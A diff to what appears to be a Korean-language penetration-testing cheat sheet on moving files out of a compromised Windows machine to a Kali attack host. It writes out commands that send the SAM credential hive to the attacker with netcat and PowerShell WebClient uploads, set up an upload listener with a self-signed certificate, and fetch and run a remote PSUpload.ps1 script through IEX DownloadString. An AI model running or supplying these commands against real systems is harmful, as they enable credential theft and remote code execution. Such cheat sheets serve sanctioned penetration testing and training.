@@ -50,14 +50,20 @@ nc.exe <칼리IP> 4444 < C:\Windows\System32\config\SAM
 ## PowerShell WebClient UploadFile
 
 ```bash
-# 칼리에서 업로드 수신 서버
-# python3 upload_server.py (커스텀 필요)
+# 칼리에서 업로드 받는 서버 (커스텀 불필요)
+pip3 install uploadserver --break-system-packages
+python3 -m uploadserver        # http, 8000/upload
+# HTTPS 로 받기 (자체서명)
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -subj '/CN=server'
+python3 -m uploadserver 443 --server-certificate server.pem
 ```
 
 ```powershell
-# 피해자에서
-(New-Object Net.WebClient).UploadFile('http://<칼리IP>/upload', 'C:\loot\SAM')
-Invoke-WebRequest -Method Post -Uri http://<칼리IP>/upload -InFile C:\loot\SAM
+# 피해자(윈도우)에서 업로드
+(New-Object Net.WebClient).UploadFile('http://<칼리IP>:8000/upload','C:\loot\SAM')
+# PSUpload 스크립트 방식
+IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/PSUpload.ps1')
+Invoke-FileUpload -Uri http://<칼리IP>:8000/upload -File C:\loot\SAM
 ```
 
 ---
